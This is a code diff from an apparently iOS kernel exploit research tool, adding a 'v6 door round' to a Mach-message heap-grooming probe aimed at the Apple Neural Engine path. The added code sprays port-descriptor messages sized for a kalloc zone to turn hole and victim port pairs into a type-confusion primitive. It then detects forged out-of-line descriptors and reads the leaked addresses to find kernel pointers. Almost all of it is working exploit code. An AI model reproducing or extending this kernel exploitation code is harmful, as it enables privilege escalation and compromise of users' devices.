@@ -31,7 +31,7 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v5-probeopen"
+#define P099_BUILD @"p099-aneprewire-v6-doorround"
 
 #define P099_INPUT_COUNT 254
 #define P099_OUTPUT_COUNT 1
@@ -215,6 +215,135 @@ static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
     return kr;
 }
 
+#pragma mark - v6 door round (portkind victims)
+
+static uint32_t g_p099_portkindN;  /* dial: last N victims send as portkind (0 = unchanged) */
+
+/* v6 door: 16 fresh port-kind descriptors + the p099 payload marker AFTER
+   the desc block, sized to stay in the kalloc.3072 class (msg 0xB60 ->
+   kdata 0xB84 <= 0xC00). Shape = p073's proven send_portkind (accepted
+   kr=0 on 23F77 AND 24A435): MACH_MSG_PORT_DESCRIPTOR + COPY_SEND per
+   fresh right; rights released post-send by the kernel send path. */
+#define P099_PK_N_DESC   16u
+#define P099_PK_PAY      0xa80u
+static BOOL p099_send_portkind_victim(mach_port_t port, uint32_t index) {
+    static const uint32_t PK_LEN = 0x20u + 0x8u /* body pad */
+        + P099_PK_N_DESC * 0xCu + P099_PK_PAY;  /* 0xB60 */
+    uint8_t *buf = calloc(1, PK_LEN + 1);
+    if (!buf) return NO;
+    mach_msg_header_t *h = (mach_msg_header_t *)buf;
+    mach_msg_body_t *bd = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
+    bd->msgh_descriptor_count = P099_PK_N_DESC;
+    mach_port_t dp[P099_PK_N_DESC];
+    uint32_t made;
+    for (made = 0; made < P099_PK_N_DESC; made++) {
+        mach_msg_port_descriptor_t *d = (mach_msg_port_descriptor_t *)
+            (buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + made * 0xCu);
+        dp[made] = p099_make_port();
+        if (!dp[made]) break;
+        d->name        = dp[made];
+        d->disposition = MACH_MSG_TYPE_COPY_SEND;
+        d->type        = MACH_MSG_PORT_DESCRIPTOR;
+    }
+    if (made != P099_PK_N_DESC) { free(buf); return NO; }
+    uint8_t *payload = buf + 0x20u + 0x8u + P099_PK_N_DESC * 0xCu;
+    /* same fingerprint pattern as p099_fill_payload, sized for the door msg */
+    for (uint32_t i = 0; i < P099_PK_PAY; i++)
+        payload[i] = (uint8_t)(0xa5u ^ (uint8_t)(index * 17u) ^ (uint8_t)(i * 13u));
+    uint64_t magic = 0x484F4C45584C4D31ULL;   /* HOLEXLM1 */
+    memcpy(payload + 0x00, &magic, 8);
+    uint32_t idx = index, role = 1;
+    memcpy(payload + 0x08, &idx, 4);
+    memcpy(payload + 0x0c, &role, 4);
+    for (uint32_t off = 0x20; off + 8 <= P099_PK_PAY; off += 16)
+        memset(payload + off, 0xEE, 8);
+    h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+    h->msgh_size = (mach_msg_size_t)PK_LEN;
+    h->msgh_remote_port = port;
+    h->msgh_local_port  = MACH_PORT_NULL;
+    h->msgh_id          = (mach_msg_id_t)(0x58590000u | (0x01u << 8) | (index & 0xffu));
+    kern_return_t kr = mach_msg(h, MACH_SEND_MSG, (mach_msg_size_t)PK_LEN,
+                                0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+    free(buf);
+    if (kr != MACH_MSG_SUCCESS) {
+        L(@"[v6] portkind victim=%u send kr=0x%x (%s)", index, kr, mach_error_string(kr));
+        return NO;
+    }
+    return YES;
+}
+
+/* v6 door readback (p073 v7d/v9 law inlined): clean port desc =
+   {name u32, pad u32, type u16 0, disp u16 0x11}; a fill record
+   {sid, flags 0xcx, tail 0x0000000100000001} on a desc reads
+   type=0x0001 (OOL-forged) = the conversion door — probe the 64-bit
+   address field fault-safely (mach_vm_read_overwrite via dlsym). */
+static BOOL p099_vmread(uint64_t addr, uint8_t *out, uint32_t n) {
+    typedef kern_return_t (*p099_vmread_t)(mach_port_t, uint64_t, uint64_t,
+                                           uint64_t, uint64_t *);
+    static p099_vmread_t vr;
+    if (!vr) vr = (p099_vmread_t)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
+    if (!vr || !out) return NO;
+    uint64_t got = 0;
+    kern_return_t kr = vr(mach_task_self(), addr, (uint64_t)n,
+                          (uint64_t)(uintptr_t)out, &got);
+    return kr == KERN_SUCCESS && got >= 4;
+}
+
+static int g_p099_oolHits;
+
+static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
+    uint8_t rbuf[0x1400];
+    memset(rbuf, 0, sizeof rbuf);
+    mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
+    kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
+                                sizeof rbuf, port, 0, MACH_PORT_NULL);
+    if (kr == MACH_RCV_TIMED_OUT) { L(@"[v6] door victim=%u EMPTY (still queued?)", idx); return; }
+    if (kr != MACH_MSG_SUCCESS) {
+        L(@"[v6] door victim=%u recv mr=0x%x — DESC PROCESSING REJECTED (forged desc seen!)",
+          idx, kr);
+        return;
+    }
+    if (!(h->msgh_bits & MACH_MSGH_BITS_COMPLEX)) { L(@"[v6] door victim=%u simple", idx); return; }
+    uint32_t cnt = ((mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t)))->msgh_descriptor_count;
+    uint32_t smashes = 0;
+    for (uint32_t i = 0; i < cnt && i < P099_PK_N_DESC; i++) {
+        uint8_t *dp = rbuf + sizeof(mach_msg_header_t) + 0x8u + i * 0xCu;
+        uint32_t name, padw; uint16_t dtype, ddisp;
+        memcpy(&name, dp + 0, 4); memcpy(&padw, dp + 4, 4);
+        memcpy(&dtype, dp + 8, 2); memcpy(&ddisp, dp + 10, 2);
+        BOOL clean = (dtype == 0u && ddisp == 0x11u);
+        if (clean) continue;
+        smashes++;
+        L(@"[v6] DOOR SMASH victim=%u desc[%u] name=0x%08x pad=0x%08x type=0x%04x disp=0x%04x "
+          @"(record: sid=%u flags=0x%08x)", idx, i, name, padw, dtype, ddisp, name, padw);
+        if (dtype == 0x0001u) {
+            uint64_t addr = (uint64_t)name | ((uint64_t)padw << 32);
+            uint8_t ool[32]; memset(ool, 0xCC, sizeof ool);
+            if (p099_vmread(addr, ool, sizeof ool)) {
+                BOOL nonzero = NO, kptr = NO;
+                for (uint32_t k2 = 0; k2 < 8; k2++) if (ool[k2] != 0xCC) { nonzero = YES; break; }
+                for (uint32_t k2 = 0; k2 + 8 <= sizeof ool; k2 += 8) {
+                    uint64_t q; memcpy(&q, ool + k2, 8);
+                    if (q >= 0xFFFFFE0000000000ULL && q < 0xFFFFFFF000000000ULL) kptr = YES;
+                }
+                if (nonzero || kptr) {
+                    g_p099_oolHits++;
+                    L(@"[v6] OOL COPYOUT victim=%u desc=%u addr=0x%012llx readable=YES "
+                      @"kernelRange=%d bytes %02x %02x %02x %02x %02x %02x %02x %02x",
+                      idx, i, addr, kptr,
+                      ool[0], ool[1], ool[2], ool[3], ool[4], ool[5], ool[6], ool[7]);
+                } else {
+                    L(@"[v6] door victim=%u desc=%u OOL addr=0x%012llx = zeroed (no copyout this shape)", idx, i, addr);
+                }
+            } else {
+                L(@"[v6] door victim=%u desc=%u OOL addr=0x%012llx unreadable (EFAULT — honest)",
+                  idx, i, addr);
+            }
+        }
+    }
+    if (smashes) L(@"[v6] door verdict victim=%u smashes=%u oolHits=%u", idx, smashes, g_p099_oolHits);
+}
+
 @implementation P099AnePrewireGroom
 
 + (NSString *)tap {
@@ -250,6 +379,23 @@ static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
         L(@"%@", [LabDeviceProfile identBlock] ?: @"ident ?");
         L(@"%@", [LabDeviceProfile huntTapWarn:@"p099"] ?: @"");
         [LabDeviceProfile stampLastTap:@"p099"];
+
+        // ---- v6 dial: Documents/p099_victim.txt "portkind=N" (last N victims as door rounds) ----
+        g_p099_portkindN = 0;
+        {
+            NSString *dialP = [docs stringByAppendingPathComponent:@"p099_victim.txt"];
+            if ([[NSFileManager defaultManager] fileExistsAtPath:dialP]) {
+                NSString *dial = [NSString stringWithContentsOfFile:dialP
+                    encoding:NSUTF8StringEncoding error:nil];
+                NSRange r = [dial rangeOfString:@"portkind="];
+                if (r.location != NSNotFound) {
+                    int v = [dial substringFromIndex:NSMaxRange(r)].intValue;
+                    if (v > 0 && v <= (int)P099_PAIR_COUNT) g_p099_portkindN = (uint32_t)v;
+                }
+                L(@"[v6] dial portkind=%u (Documents/p099_victim.txt; last %u victims = door rounds)",
+                  g_p099_portkindN, g_p099_portkindN);
+            }
+        }
         if ([LabDeviceProfile aneFillCapped]) {
             L(@"EXPECT-BAD fill_cap=1. 254-in CheckandPrewire on this SKU -> 0xe00002c2. Probe still fires.");
         } else if (LabOff() && LabOff()->ane_table_size && LabOff()->ane_table_size != 0x820u) {
@@ -280,9 +426,13 @@ static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
             for (uint32_t i = 0; i < P099_PAIR_COUNT; i++) {
                 pairs[i].hole = p099_make_port();
                 pairs[i].victim = p099_make_port();
+                BOOL pkVictim = (g_p099_portkindN &&
+                                 i >= P099_PAIR_COUNT - g_p099_portkindN);
                 if (pairs[i].hole && pairs[i].victim &&
                     p099_send_msg(pairs[i].hole, i, 0) &&
-                    p099_send_msg(pairs[i].victim, i, 1)) pairOK++;
+                    (pkVictim
+                        ? p099_send_portkind_victim(pairs[i].victim, i)
+                        : p099_send_msg(pairs[i].victim, i, 1))) pairOK++;
             }
             for (uint32_t i = 0; i < P099_PAIR_COUNT; i++) {
                 if (pairs[i].hole && p099_recv_payload(pairs[i].hole, NULL) == MACH_MSG_SUCCESS) holesFreed++;
@@ -449,8 +599,14 @@ static kern_return_t p099_recv_payload(mach_port_t port, uint8_t *payloadOut) {
             uint8_t actual[P099_PAYLOAD_SIZE];
             int hits = 0;
             int dumped = 0;
-            for (uint32_t i = 0; i < P099_PAIR_COUNT && pairs && hits < 4; i++) {
+            for (uint32_t i = 0; i < P099_PAIR_COUNT && pairs; i++) {
                 if (!pairs[i].victim) continue;
+                if (g_p099_portkindN && i >= P099_PAIR_COUNT - g_p099_portkindN) {
+                    /* v6 door round: the desc readback IS the conversion verdict;
+                       door rounds do not consume the payload-diff budget */
+                    p099_recv_portkind_door(pairs[i].victim, i);
+                    continue;
+                }
                 kern_return_t rkr = p099_recv_payload(pairs[i].victim, actual);
                 if (rkr != MACH_MSG_SUCCESS) continue;
                 p099_fill_payload(expected, i, 1);
